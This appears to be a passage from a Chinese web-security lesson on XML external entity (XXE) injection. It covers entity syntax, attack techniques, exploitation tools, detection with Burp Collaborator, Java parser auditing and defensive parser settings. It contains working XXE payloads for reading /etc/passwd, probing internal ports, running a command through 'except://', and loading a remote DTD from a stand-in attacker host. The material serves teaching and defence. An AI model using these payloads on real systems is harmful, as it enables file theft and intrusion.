+<pre class="lang-java hljs" data-nodeid="1062"><code data-language="java">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre>
+<p data-nodeid="1063">声明实体 xxe，用于读取 /etc/passwd 文件，然后通过 &amp;xxe; 来引用执行。</p>
+<p data-nodeid="1064"><strong data-nodeid="1177">（2）参数实体</strong>声明主要用于后续使用，与普通实体不同的是，它中间有百分号字符（%），其声明格式如下：</p>
+<pre class="lang-java hljs" data-nodeid="1065"><code data-language="java">&lt;!ENTITY % 实体名称 <span class="hljs-string">"实体的值"</span>&gt;
+或者
+&lt;!ENTITY % 实体名称 SYSTEM <span class="hljs-string">"URI"</span>&gt;
+</code></pre>
+<p data-nodeid="1066">举个例子：</p>
+<pre class="lang-xml hljs" data-nodeid="1067"><code data-language="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [
+  	<span class="hljs-meta">&lt;!ENTITY  % <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"http://hacker.com/evil.dtd"</span> &gt;</span>
+  	%xxe;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>
+  	<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;evil;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre>
+<p data-nodeid="1068">xxe.dtd 内容如下：</p>
+<pre class="lang-xml hljs" data-nodeid="1069"><code data-language="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">evil</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///etc/passwd"</span>&gt;</span>
+</code></pre>
+<p data-nodeid="1070">上面先声明 xxe 参数实体，引入外部实体 "http://hacker.com/evil.dtd"，里面声明了一个叫 evil 的实体，用于读取 /etc/passwd 文件，最后在通过 &amp;evil; 来引用执行。<br>
+在不同的语言中其支持协议还不一样，需要根据业务场景来实测，常见的协议有 file、http、ftp、https、except 等等。</p>
+<h3 data-nodeid="1071">危害：XXE 的常见攻击手段</h3>
+<p data-nodeid="1072">下面介绍一些 XXE 漏洞的常见利用方法，并提供一些 payload 测试用例，测试仍以 Pikachu XXE 题目作为演示。</p>
+<h4 data-nodeid="1073">1.内网攻击</h4>
+<p data-nodeid="1074">XXE 支持 http 等 URL，所以同样可以产生与 SSRF 一样效果，对内网进行指纹探测、端口扫描、漏洞攻击等行为。</p>
+<p data-nodeid="1075">比如以下的 payload：</p>
+<pre class="lang-xml hljs" data-nodeid="1076"><code data-language="xml"><span class="hljs-meta">&lt;?xml version = "1.0"?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [
+    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"http://192.168.31.124:4444/test"</span>&gt;</span>
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">r</span>&gt;</span>
+</code></pre>
+<p data-nodeid="1077">由于不存在该端口，所以会出错误：</p>
+<p data-nodeid="1793" class=""><img src="https://s0.lgstatic.com/i/image/M00/8E/F5/CgqCHmAGWcqAO_PgAASscDOp6uA731.png" alt="图片1.png" data-nodeid="1797"></p>
+<div data-nodeid="1794"><p style="text-align:center">图 1  探测内网端口失败</p></div>
+
+
+
+
+<p data-nodeid="1080">成功的话，会返回空白，通过这种对比差异，可以判断是否利用成功：</p>
+<p data-nodeid="2812" class=""><img src="https://s0.lgstatic.com/i/image2/M01/06/D6/Cip5yGAGWdyAQDS2AANXkfuguok138.png" alt="图片2.png" data-nodeid="2816"></p>
+<div data-nodeid="2813"><p style="text-align:center">图 2  探测内网端口成功</p></div>
+
+
+
+
+<h4 data-nodeid="1083">2.读取本地文件</h4>
+<p data-nodeid="1084">通过 file:// 可以读取本地文件，造成敏感文件泄露：</p>
+<pre class="lang-xml hljs" data-nodeid="1085"><code data-language="xml"><span class="hljs-meta">&lt;?xml version = "1.0"?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [
+    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///etc/passwd"</span>&gt;</span>
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span>
+</code></pre>
+<p data-nodeid="1086">输入上述 XML 提交后，成功读取到 /etc/passwd 文件内容：</p>
+<p data-nodeid="1087"><img src="https://s0.lgstatic.com/i/image2/M01/05/7B/CgpVE2AABv6AfyHcAAGL6fVMVng679.png" alt="Drawing 2.png" data-nodeid="1207"></p>
+<div data-nodeid="1088"><p style="text-align:center">图 3  利用XXE漏洞读取 /etc/passwd</p></div>
+<h4 data-nodeid="1089">3.远程执行命令</h4>
+<p data-nodeid="1090">如果是 PHP 环境下并安装 except 扩展，就可以利用它执行系统命令了。这种情况现在已经比较少见了，更多还是要利用其他漏洞来实现命令或代码执行。</p>
+<pre class="lang-java hljs" data-nodeid="1091"><code data-language="java">&lt;?xml version = "1.0"?&gt;
+&lt;!DOCTYPE ANY [
+    &lt;!ENTITY xxe SYSTEM "except://id"&gt;
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+</code></pre>
+<h3 data-nodeid="1092">XXE 漏洞利用工具</h3>
+<h4 data-nodeid="1093">1.XXEinjector</h4>
+<p data-nodeid="1094">推荐一款综合型的 XXE 漏洞利用工具<a href="https://github.com/enjoiz/XXEinjector" data-nodeid="1215">XXEinjector</a>，用 Ruby 开发，运行前需要先安装 ruby。</p>
+<pre class="lang-java hljs" data-nodeid="1095"><code data-language="java">sudo apt install ruby
+</code></pre>
+<p data-nodeid="1096">通过输入请求包数据，并指定攻击行为，比如列目录、读文件等。</p>
+<pre class="lang-java hljs" data-nodeid="1097"><code data-language="java">$ cat req.txt&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-number">1</span> ↵
+GET /mmpaymd/ordercallback HTTP/<span class="hljs-number">1.1</span>
+Host: <span class="hljs-number">100.95</span><span class="hljs-number">.204</span><span class="hljs-number">.69</span>:<span class="hljs-number">8081</span>
+Upgrade-Insecure-Requests: <span class="hljs-number">1</span>
+User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">65.0</span><span class="hljs-number">.3325</span><span class="hljs-number">.181</span> Safari/<span class="hljs-number">537.36</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh,zh-CN;q=0.9,en;q=0.8
+Cache-Control: max-age=259200
+Connection: keep-alive
+</span></code></pre>
+<p data-nodeid="1098">常用命令如下：<br>
+<img src="https://s0.lgstatic.com/i/image2/M01/05/79/Cip5yGAABwiAda6kAAF5gVHcGUo024.png" alt="Drawing 3.png" data-nodeid="1222"></p>
+<div data-nodeid="1099"><p style="text-align:center">图 4  XXEinjector 常用命令</p></div>
+<p data-nodeid="1100">不过，不能完全依赖于 XXEinjector，因为之前我在测试时，发现它也有利用不成功的情况，需要自己多测试验证下。</p>
+<p data-nodeid="1101">其他更多 XXE payload，可以参考<a href="https://github.com/payloadbox/xxe-injection-payload-list" data-nodeid="1227">“XML External Entity (XXE) Injection Payload List”</a>。</p>
+<h4 data-nodeid="1102">2.XXExploiter</h4>
+<p data-nodeid="1103">如果你记不住上面那些 XXE payload，还有个工具可以帮你生成，一款集 payload 生成与发包利用的 XXE 利用工具 <a href="https://github.com/luisfontes19/xxexploiter" data-nodeid="1233">XXExploiter</a>，它可以启动服务提供远程 DTD 文件去实现利用。</p>
+<p data-nodeid="4339" class=""><img src="https://s0.lgstatic.com/i/image2/M01/06/D8/CgpVE2AGWfCAdbhhAAQe4lr3PMM251.png" alt="图片5.png" data-nodeid="4343"></p>
+<div data-nodeid="4340"><p style="text-align:center">图 5   xxeploiter 利用方法</p></div>
+
+
+
+
+
+
+<p data-nodeid="1106">就功能而言，个人觉得它比 XXEinjector 更优秀，生成 payload 的功能还可以用于辅助手工测试，结合业务场景自己做一些调整。</p>
+<h3 data-nodeid="1107">XXE 漏洞挖掘</h3>
+<h4 data-nodeid="1108">1.黑盒测试</h4>
+<p data-nodeid="1109">XXE 依然如 SSRF 分为有回显、无回显。通过 XXE 可以造成 SSRF，所以它的检测思路与 SSRF 大同小异，比较通用的方式也是构造特定外网服务器的访问请求，然后查询外网服务器的请求日志，以判断是否请求成功。</p>
+<p data-nodeid="1110">无论是手工测试还是自动化，当前检测 XXE 和 SSRF 漏洞的方式大多是基于此原理。</p>
+<p data-nodeid="1111">上一讲介绍的 Burp Collaborator，在此处就用得上，使用前面介绍的常见攻击手段，去尝试构造多种测试请求，是否向 Burp Collaborator Server 请求成功，就可以很容易地判断是否存在 XXE。</p>
+<p data-nodeid="1112">以 Pikachu 靶场的 XXE 题目为例。用 Burp Collaborator 获得 DNS 解析服务器的地址 b5hcm1ypwg6bvqnxtm6iyqao9ff53u.burpcollaborator.net，然后构造 XXE payload。</p>
+<pre class="lang-xml hljs" data-nodeid="1113"><code data-language="xml"><span class="hljs-meta">&lt;?xml version = "1.0"?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [
+    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"http://b5hcm1ypwg6bvqnxtm6iyqao9ff53u.burpcollaborator.net"</span>&gt;</span>
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span>
+</code></pre>
+<p data-nodeid="5360" class="">将上述 payload 输入文本框，点“提交”：<br>
+<img src="https://s0.lgstatic.com/i/image2/M01/06/D6/Cip5yGAGWgSAfTxdAAR6XBUFZa4113.png" alt="图片6.png" data-nodeid="5366"></p>
+<div data-nodeid="5361" class="te-preview-highlight"><p style="text-align:center">图 6  输入 xml payload</p></div>
+
+
+
+
+<p data-nodeid="1116">在 Burp Collaborator client 上点击“Poll now”就可以看到请求日志，说明确实存在 XXE 漏洞。</p>
+<p data-nodeid="1117"><img src="https://s0.lgstatic.com/i/image2/M01/05/79/Cip5yGAAByaANi3-AAE7G8SiyNI515.png" alt="Drawing 6.png" data-nodeid="1253"></p>
+<div data-nodeid="1118"><p style="text-align:center">图 7  利用 XXE 请求 Collaborator server 成功</p></div>
+<h4 data-nodeid="1119">2.白盒审计</h4>
+<p data-nodeid="1120">以 Java 为例，可以在代码中搜索常用的 XML 解析器，看它们在实例化之后，是否有关闭外部实体引用功能，如果没有就可能存在 XXE 漏洞。</p>
+<pre class="lang-java hljs" data-nodeid="1121"><code data-language="java">javax.xml.parsers.DocumentBuilderFactory;
+javax.xml.parsers.SAXParser
+javax.xml.transform.TransformerFactory
+javax.xml.validation.Validator
+javax.xml.validation.SchemaFactory
+javax.xml.transform.sax.SAXTransformerFactory
+javax.xml.transform.sax.SAXSource
+org.xml.sax.XMLReader
+DocumentHelper.parseText
+DocumentBuilder
+org.xml.sax.helpers.XMLReaderFactory
+org.dom4j.io.SAXReader
+org.jdom.input.SAXBuilder
+org.jdom2.input.SAXBuilder
+javax.xml.bind.Unmarshaller
+javax.xml.xpath.XpathExpression
+javax.xml.stream.XMLStreamReader
+org.apache.commons.digester3.Digester
+rg.xml.sax.SAXParseExceptionpublicId
+</code></pre>
+<p data-nodeid="1122">这部分可以结合<a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" data-nodeid="1259">“XML External Entity Prevention Cheat Sheet”</a>来看，不同语言、不同的 XML 解析库有不同的关闭外部实体引用的方法，在代码审计时，可以对照着看，然后拿一些 xxe payload 实际验证下。</p>
+<h3 data-nodeid="1123">防御 XXE 漏洞</h3>
+<p data-nodeid="1124">要防御 XXE 也比较简单，<strong data-nodeid="1267">关闭外部实体引用即可</strong>。比如在 Java 中常用于解析 XML 的 DocumentBuilderFactory，就可以通过 setFeature 方法防御 XXE 漏洞，注意是组合使用，而不是单一防御。</p>
+<pre class="lang-java hljs" data-nodeid="1125"><code data-language="java">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+String FEATURE = <span class="hljs-keyword">null</span>;
+<span class="hljs-keyword">try</span> {
+    <span class="hljs-comment">// 禁用DTD</span>
+    FEATURE = <span class="hljs-string">"http://apache.org/xml/features/disallow-doctype-decl"</span>;
+    dbf.setFeature(FEATURE, <span class="hljs-keyword">true</span>);
+
+    <span class="hljs-comment">// 禁用普通实体</span>
+    FEATURE = <span class="hljs-string">"http://xml.org/sax/features/external-general-entities"</span>;
+    dbf.setFeature(FEATURE, <span class="hljs-keyword">false</span>);
+
+    <span class="hljs-comment">// 禁用参数实体</span>
+    FEATURE = <span class="hljs-string">"http://xml.org/sax/features/external-parameter-entities"</span>;
+    dbf.setFeature(FEATURE, <span class="hljs-keyword">false</span>);
+
+    <span class="hljs-comment">// 禁用外部DTD引用</span>
+    FEATURE = <span class="hljs-string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>;
+    dbf.setFeature(FEATURE, <span class="hljs-keyword">false</span>);
+
+    <span class="hljs-comment">// 禁用XInclude处理功能</span>
+    dbf.setXIncludeAware(<span class="hljs-keyword">false</span>);
+
+    <span class="hljs-comment">// 禁用扩展实体引用节点，注意：只使用该方法并不能完全防御XXE</span>
+    dbf.setExpandEntityReferences(<span class="hljs-keyword">false</span>);
+} <span class="hljs-keyword">catch</span> () {
+  ...
+}
+   <span class="hljs-comment">// Load XML file or stream using a XXE agnostic configured parser...</span>
+   DocumentBuilder safebuilder = dbf.newDocumentBuilder();
+</code></pre>
+<p data-nodeid="1126">不同的 XML 解析库有不同的关闭方式，比如全面介绍 XXE 防御方案的是 OWASP 发表的<a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" data-nodeid="1271">“XML External Entity Prevention Cheat Sheet”</a>，针对不同的语言、XML 解析库，给出不同的防御方案，并提供关闭 XML 实体引用的代码示例，你在防御或者需要修复 XXE 漏洞时可以作为参考。</p>
+<p data-nodeid="1127">如果业务需要引用外部实体，建议采用白名单方式限制。</p>
+<h3 data-nodeid="1128">小结</h3>
+<p data-nodeid="1129">本节课介绍了 XXE（XML 实体注入）漏洞相关的基础知识、漏洞成因和常见攻击手段，有时需要根据有无回显的情况，采取不同的测试方法。</p>
+<blockquote data-nodeid="1130">
+<p data-nodeid="1131">在日常实际应用中，大家都习惯当作无回显的情况来看待，因为无回显的检测方法同样适用于有回显的，相对比较通用。</p>
+</blockquote>
+<p data-nodeid="1132">同时，给你推荐了 XXEinjector 和 XXExploiter 两款利用工具，在辅助检测 XXE 漏洞时会有所帮助。个人更偏好用 XXExploiter，因为它功能更多，利用成功率更高一些，还可以生成 payload 用于测试。</p>
+<p data-nodeid="1133" class="">Burp Collaborator&nbsp;在检测无回显的 XXE 漏洞时，非常好用，结合 XXExploiter 生成的 payload，对其中的 URL 调整为 Burp Collaborator&nbsp; Server，借助 Burp Collaborator 的自动检测服务端的请求日志，可以帮助判断漏洞是否存在，又不用再自己搭建外网服务器，是一种节约成本的检测方法。</p></div>
+
+</body></html>
